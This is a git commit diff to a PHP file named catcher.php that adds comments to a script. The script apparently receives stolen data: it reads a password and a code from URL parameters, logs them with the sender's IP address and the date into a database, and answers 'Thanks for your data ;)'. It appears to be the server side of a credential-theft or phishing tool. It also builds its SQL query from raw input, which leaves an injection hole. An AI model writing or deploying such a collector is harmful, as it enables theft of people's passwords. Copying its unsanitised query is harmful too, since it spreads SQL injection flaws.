e7917ae114b0979412bbbe91941f763e8304ea7d
Eduardo <41192980+blueudp@users.noreply.github.com>
2018-09-22 16:05:33 +0200

    Update catcher.php

--- Server/catcher.php
+++ Server/catcher.php
@@ -1,17 +1,16 @@
 <?php
+/* This php  */
+include('db.inc.php'); # contains DB connection data
 
-include('db.inc.php');
+$ip = $_SERVER['REMOTE_ADDR']; # saves ip
+$date = date("m-d-y h:i"); # check date
+$password = @($_GET['pwd']); # get passwd
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$date = date("m-d-y h:i");
-$password = @($_GET['pwd']);
-
-$code = @($_GET['code']);
+$code = @($_GET['code']); # get code
 
 $query = "INSERT INTO data(date,ip,password,code) VALUES('$date','$ip','$password','$code')";
 $exec = mysqli_query($link, $query);
 
 echo "Thanks for your data ;)";
-
 
 ?> 
